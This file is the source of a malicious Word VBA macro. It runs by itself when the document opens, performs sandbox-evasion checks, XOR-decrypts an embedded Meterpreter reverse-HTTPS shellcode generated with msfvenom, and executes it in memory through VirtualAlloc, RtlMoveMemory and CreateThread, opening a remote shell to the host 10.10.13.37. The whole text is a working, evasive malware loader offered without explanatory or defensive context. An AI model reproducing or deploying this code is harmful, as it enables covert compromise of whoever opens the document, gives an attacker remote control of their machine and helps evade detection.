Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim buf As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date
  Dim poxor As String
  Dim j As Integer
  
  'Sandbox?
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep check
  dream = Int((1500 * 4) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", before, Now()) < dream / 1000 Then
    Exit Function
  End If

  ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'xor_key!'
  buf = Array(149,134,208,110,111,109,9,95,183,59,251,51,68,249,59,83,237,59,120,224,128,80,211,37,75,88,145,254,1,119,82,175,194,79,0,31,112,73,127,241,254,100,111,152,39,26,130,59,229,55,79,39,234,54,78,104,143,237,41,20,236,165,43,40,110,189,226,54,85,35,212,43,119,111,160,228,170,6,89,22,187, _
5,226,111,137,95,144,92,169,194,164,144,125,96,179,74,137,42,146,106,17,145,94,34,64,26,141,49,229,45,87,94,176,9,229,127,42,232,42,121,94,227,186,109,229,94,190,230,41,77,74,62,4,17,56,46,35,150,191,62,54,54,226,119,182,228,144,146,150,51,29,64,109,99,111,6,4,18,81,45,49, _
55,124,70,79,105,214,134,144,189,209,254,100,95,112,72,176,38,57,55,79,233,7,105,154,138,14,101,5,169,198,88,173,55,97,111,113,227,232,133,34,53,15,96,113,57,46,15,6,133,98,182,142,154,138,231,11,100,36,62,55,255,204,24,8,154,138,225,175,25,99,145,59,123,42,143,135,9,115,97,99, _
24,101,53,52,103,62,6,93,183,167,50,150,187,230,167,112,31,66,249,95,53,38,1,108,121,101,95,50,5,109,1,54,209,32,186,156,186,253,32,11,99,36,54,8,88,51,176,166,0,145,186,238,145,110,24,119,40,9,116,50,105,95,12,105,60,1,110,112,107,95,146,188,57,29,6,49,46,14,145,166, _
63,61,141,105,123,63,180,25,145,160,145,134,246,150,145,154,94,179,72,178,7,168,156,221,137,113,67,111,55,194,250,208,244,145,160,79,89,31,101,238,136,129,22,119,222,24,35,67,6,4,95,61,144,184)

  ' XOR-decrypt  shellcode
  poxor = "xor_key!"
  j = 1
  For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor Asc(Left(Mid(poxor, j), 1))
    j = j + 1
    If j > Len(poxor) Then
        j = 1
    End If
    
  Next i

  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
